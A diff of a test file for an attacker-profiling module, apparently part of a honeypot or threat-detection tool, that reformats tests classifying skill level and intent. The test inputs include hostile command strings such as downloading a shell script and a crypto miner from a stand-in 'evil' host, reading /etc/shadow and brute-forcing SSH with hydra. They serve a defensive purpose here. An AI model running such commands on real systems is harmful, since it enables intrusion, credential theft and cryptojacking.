@@ -38,11 +38,7 @@ describe('estimateSkillLevel', () => {
   });
 
   it('should classify basic scanning as script_kiddie', () => {
-    const result = estimateSkillLevel(
-      ['id', 'whoami', 'ls'],
-      ['T1082'],
-      [],
-    );
+    const result = estimateSkillLevel(['id', 'whoami', 'ls'], ['T1082'], []);
     expect(result.level).toBe('script_kiddie');
   });
 
@@ -50,7 +46,7 @@ describe('estimateSkillLevel', () => {
     const result = estimateSkillLevel(
       ['nmap -sV target', 'hydra -l admin ssh://target'],
       ['T1082', 'T1110'],
-      ['nmap', 'Hydra'],
+      ['nmap', 'Hydra']
     );
     expect(result.level).toBe('intermediate');
   });
@@ -59,7 +55,7 @@ describe('estimateSkillLevel', () => {
     const result = estimateSkillLevel(
       ['base64 -d payload', 'python -c "import socket"', 'wget http://evil/shell.py'],
       ['T1082', 'T1110', 'T1059', 'T1105'],
-      ['nmap', 'Hydra'],
+      ['nmap', 'Hydra']
     );
     const advancedLevels = ['advanced', 'apt'];
     expect(advancedLevels).toContain(result.level);
@@ -69,7 +65,7 @@ describe('estimateSkillLevel', () => {
     const result = estimateSkillLevel(
       ['mimikatz.exe', 'cobalt strike beacon', 'bloodhound ingest'],
       ['T1082', 'T1110', 'T1003', 'T1059', 'T1105', 'T1562'],
-      ['Mimikatz', 'Cobalt Strike', 'BloodHound', 'nmap'],
+      ['Mimikatz', 'Cobalt Strike', 'BloodHound', 'nmap']
     );
     expect(result.level).toBe('apt');
     expect(result.score).toBeGreaterThanOrEqual(60);
@@ -79,7 +75,7 @@ describe('estimateSkillLevel', () => {
     const result = estimateSkillLevel(
       Array.from({ length: 20 }, (_, i) => `cmd${i} base64 -d`),
       ['T1', 'T2', 'T3', 'T4', 'T5', 'T6', 'T7', 'T8'],
-      ['tool1', 'tool2', 'tool3', 'tool4', 'tool5', 'tool6', 'tool7', 'tool8'],
+      ['tool1', 'tool2', 'tool3', 'tool4', 'tool5', 'tool6', 'tool7', 'tool8']
     );
     expect(result.score).toBeLessThanOrEqual(100);
   });
@@ -92,17 +88,14 @@ describe('classifyIntent', () => {
   });
 
   it('should classify credential dumping as credential_harvesting', () => {
-    const intent = classifyIntent(
-      ['cat /etc/shadow', 'mimikatz credential dump'],
-      ['T1003'],
-    );
+    const intent = classifyIntent(['cat /etc/shadow', 'mimikatz credential dump'], ['T1003']);
     expect(intent).toBe('credential_harvesting');
   });
 
   it('should classify miner deployment as cryptomining', () => {
     const intent = classifyIntent(
       ['wget http://evil/xmrig', 'chmod +x xmrig', './xmrig --pool stratum'],
-      ['T1496'],
+      ['T1496']
     );
     expect(intent).toBe('cryptomining');
   });
@@ -280,7 +273,7 @@ describe('AttackerProfiler', () => {
     // Skill level should be same or higher
     const SKILL_ORDER = ['script_kiddie', 'intermediate', 'advanced', 'apt'];
     expect(SKILL_ORDER.indexOf(profile2.skillLevel)).toBeGreaterThanOrEqual(
-      SKILL_ORDER.indexOf(firstLevel),
+      SKILL_ORDER.indexOf(firstLevel)
     );
   });
 });
